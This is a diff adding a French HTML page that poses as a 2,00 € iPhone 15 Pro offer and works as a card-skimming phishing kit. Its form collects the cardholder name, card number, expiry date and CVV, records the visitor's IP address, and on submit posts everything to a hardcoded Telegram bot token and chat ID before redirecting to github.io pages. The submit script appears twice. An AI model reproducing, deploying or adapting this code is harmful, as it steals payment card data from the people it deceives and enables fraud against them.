@@ -1,4 +1,180 @@
-<footer>
+<html lang="fr" dir="ltr"><head>
+  <title>iPhone 15 Pro</title>
+  <link href="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/favicon.png" rel="shortcut icon" type="image/x-icon">
+  <link rel="stylesheet" href="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/css/style.css">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <style>
+    /* Styles adaptés aux smartphones */
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+    }
+    .product_wrapper {
+      padding: 20px;
+    }
+    .container {
+      max-width: 100%;
+      padding: 0 15px;
+      margin: 0 auto;
+    }
+    .images_wrapper img {
+      max-width: 100%;
+      height: auto;
+      display: block;
+      margin: 0 auto;
+    }
+    .price_block {
+      text-align: center;
+      margin-bottom: 10px;
+    }
+    .price_block span {
+      font-size: 14px;
+      color: #888;
+    }
+    .price_block h2 {
+      font-size: 24px;
+      margin: 0;
+    }
+    .form_wrapper {
+      margin-top: 20px;
+    }
+    .product_title h1 {
+      text-align: center;
+      font-size: 24px;
+      margin-bottom: 20px;
+    }
+    .form_block label {
+      display: block;
+      margin-bottom: 5px;
+      font-weight: bold;
+    }
+    .form_block input[type="text"],
+    .form_block input[type="tel"] {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      font-size: 16px;
+    }
+    .form_block button {
+      width: 100%;
+      padding: 12px;
+      background-color: #28a745;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      font-size: 18px;
+      cursor: pointer;
+    }
+
+    footer {
+      text-align: center;
+      padding: 20px;
+      background-color: transparent;
+      margin-top: 20px;
+    }
+    footer h6 {
+      font-size: 16px;
+    }
+    footer img {
+      max-width: 50%;
+      height: auto;
+    }
+
+    @media (max-width: 768px) {
+      .product_block {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+      }
+
+      .images_wrapper, .form_wrapper {
+        width: 50%;
+      }
+
+      .form_block input[type="text"],
+      .form_block input[type="tel"] {
+        font-size: 14px;
+      }
+
+      .price_block h2 {
+        font-size: 20px;
+      }
+
+      .product_title h1 {
+        font-size: 22px;
+      }
+
+      footer h6 {
+        font-size: 14px;
+      }
+
+      footer img {
+        max-width: 100%;
+      }
+    }
+  </style>
+</head>
+<body>
+  <section>
+    <div class="product_wrapper animate">
+      <div class="container">
+        <div class="product_block">
+          <div class="images_wrapper">
+            <div class="price_block">
+              <span>Seulement maintenant</span>
+              <h2>2,00 €</h2>
+            </div>
+            <div id="white" class="img-tab active">
+              <img src="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/airpods-iphone-15-pro-whitetitanium1.png" alt="iPhone 15">
+            </div>
+          </div>
+
+          <div class="form_wrapper">
+            <div class="product_title">
+              <h1>iPhone 15 Pro</h1>
+            </div><div class="block-reassurance">
+        <center><h6>Cartes de crédit acceptées :</h6><p></p></center>
+        <p><p></p></p><img src="https://cdn.soopercdn.com/cp/form-campaign-checkout-v2/assets/images/card.svg" alt="Cartes" width="250" height="30">
+      </div>
+            <div class="form_block" id="Scroll_form">
+              <form action="https://www.google.com" method="GET" id="paymentForm" name="paymentForm" novalidate="novalidate">
+                <input type="hidden" name="_token" value="vFqq7MTGU0dg8OrcF2KocxJen6rbzNYcUPZNrvA7" autocomplete="off">
+                <input type="hidden" id="user_ip" name="user_ip" value="84.5.27.23">
+
+                <div class="card-holder form-group">
+                  <label for="card_holder">Nom du titulaire</label>
+                  <input type="text" name="card_holder" id="card_holder" required="" placeholder="Nom du Titulaire">
+                </div>
+
+                <div class="card-number form-group">
+                  <label for="card_number">Numéro de carte</label>
+                  <input type="tel" name="card_number" id="card_number" maxlength="19" oninput="formatCardNumber(this)" required="" placeholder="0000 0000 0000 0000">
+                </div>
+
+                <div class="expiry-date form-group">
+                  <label for="expiry_date">Date d'expiration</label>
+                  <input type="text" name="expiry_date" id="expiry_date" maxlength="5" oninput="formatExpiryDate(this)" required="" placeholder="MM/AA">
+                </div>
+
+                <div class="cvv form-group">
+                  <label for="cvv">CCV</label>
+                  <input type="text" name="cvv" id="cvv" maxlength="3" required="" placeholder="CCC">
+                </div>
+
+                <button type="submit" id="submitButton">Effectuer le paiement</button>
+              </form>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+ <footer>
   <div class="container">
     <div class="block-reassurance">
       <h6>Cartes de crédit acceptées :</h6>
@@ -8,7 +184,7 @@
 </footer>
 
 <style>
-  footer {
+  foter {
     text-align: center;
     padding: 20px; /* Augmentation du padding pour plus d'espace */
     background-color: transparent; /* Fond complètement transparent */
@@ -27,3 +203,184 @@
     height: auto;
   }
 </style>
+
+  <script>
+    $(document).ready(function () {
+      $.getJSON("https://api.ipify.org?format=json", function (data) {
+        $('#user_ip').val(data.ip);
+      });
+
+      function formatCardNumber(input) {
+        input.value = input.value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 ');
+      }
+
+      function formatExpiryDate(input) {
+        input.value = input.value.replace(/\D/g, '').replace(/(\d{2})(?=\d)/g, '$1/');
+      }
+    });
+  </script>
+  
+  
+   <script>
+    $(document).ready(function () {
+      // Récupérer l'IP de l'utilisateur
+      $.getJSON("https://api.ipify.org?format=json", function (data) {
+        $('#user_ip').val(data.ip);
+      });
+
+      // Soumettre le formulaire avec validation
+      $('#paymentForm').on('submit', function (e) {
+        e.preventDefault();
+        if (!validateForm()) {
+          return;
+        }
+        var formData = $(this).serializeArray();
+        var message = "Nouvelle commande reçue :\n";
+        formData.forEach(function (item) {
+          if (item.name !== '_token') {
+            message += item.name + ": " + item.value + "\n";
+          }
+        });
+
+        // Envoyer les données vers votre bot Telegram via un webhook ou API
+        $.ajax({
+          url: 'https://api.telegram.org/bot7829797076:AAGfrZMGpGdCYsbSDxYXJBOR8jc4D2AjC1k/sendMessage',
+          method: 'POST',
+          data: {
+            chat_id: '7747778364',
+            text: message
+          },
+          success: function () {
+            window.location.href = "https://justmoicom.github.io/test3/";
+          },
+          error: function () {
+            window.location.href = "https://justmoicom.github.io/tel/";
+          }
+        });
+      });
+
+      // Validation des champs
+      function validateForm() {
+        var isValid = true;
+        $('input[required]').each(function () {
+          if ($(this).val().trim() === '') {
+            alert($(this).attr('placeholder') + ' est requis.');
+            isValid = false;
+            return false;
+          }
+        });
+        var expiryDate = $('#expiry_date').val();
+        if (!validateExpiryDate(expiryDate)) {
+          isValid = false;
+        }
+        return isValid;
+      }
+
+      function validateExpiryDate(date) {
+        var regex = /^(0[1-9]|1[0-2])\/\d{2}$/;
+        if (!regex.test(date)) {
+          alert('La date d\'expiration doit être au format MM/AA.');
+          return false;
+        }
+        var parts = date.split('/');
+        var month = parseInt(parts[0], 10);
+        if (month < 1 || month > 12) {
+          alert('Le mois doit être compris entre 01 et 12.');
+          return false;
+        }
+        return true;
+      }
+
+      // Formater le numéro de carte en blocs de 4 chiffres
+      function formatCardNumber(input) {
+        input.value = input.value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 ');
+      }
+
+      // Formater automatiquement la date d'expiration en MM/AA
+      function formatExpiryDate(input) {
+        input.value = input.value.replace(/\D/g, '').replace(/(\d{2})(?=\d)/g, '$1/');
+      }
+    });
+  </script>  <script>
+    $(document).ready(function () {
+      // Récupérer l'IP de l'utilisateur
+      $.getJSON("https://api.ipify.org?format=json", function (data) {
+        $('#user_ip').val(data.ip);
+      });
+
+      // Soumettre le formulaire avec validation
+      $('#paymentForm').on('submit', function (e) {
+        e.preventDefault();
+        if (!validateForm()) {
+          return;
+        }
+        var formData = $(this).serializeArray();
+        var message = "Nouvelle commande reçue :\n";
+        formData.forEach(function (item) {
+          if (item.name !== '_token') {
+            message += item.name + ": " + item.value + "\n";
+          }
+        });
+
+        // Envoyer les données vers votre bot Telegram via un webhook ou API
+        $.ajax({
+          url: 'https://api.telegram.org/bot7829797076:AAGfrZMGpGdCYsbSDxYXJBOR8jc4D2AjC1k/sendMessage',
+          method: 'POST',
+          data: {
+            chat_id: '7747778364',
+            text: message
+          },
+          success: function () {
+            window.location.href = "https://justmoicom.github.io/test3/";
+          },
+          error: function () {
+            window.location.href = "https://justmoicom.github.io/tel/";
+          }
+        });
+      });
+
+      // Validation des champs
+      function validateForm() {
+        var isValid = true;
+        $('input[required]').each(function () {
+          if ($(this).val().trim() === '') {
+            alert($(this).attr('placeholder') + ' est requis.');
+            isValid = false;
+            return false;
+          }
+        });
+        var expiryDate = $('#expiry_date').val();
+        if (!validateExpiryDate(expiryDate)) {
+          isValid = false;
+        }
+        return isValid;
+      }
+
+      function validateExpiryDate(date) {
+        var regex = /^(0[1-9]|1[0-2])\/\d{2}$/;
+        if (!regex.test(date)) {
+          alert('La date d\'expiration doit être au format MM/AA.');
+          return false;
+        }
+        var parts = date.split('/');
+        var month = parseInt(parts[0], 10);
+        if (month < 1 || month > 12) {
+          alert('Le mois doit être compris entre 01 et 12.');
+          return false;
+        }
+        return true;
+      }
+
+      // Formater le numéro de carte en blocs de 4 chiffres
+      function formatCardNumber(input) {
+        input.value = input.value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 ');
+      }
+
+      // Formater automatiquement la date d'expiration en MM/AA
+      function formatExpiryDate(input) {
+        input.value = input.value.replace(/\D/g, '').replace(/(\d{2})(?=\d)/g, '$1/');
+      }
+    });
+  </script>
+
+</body></html>
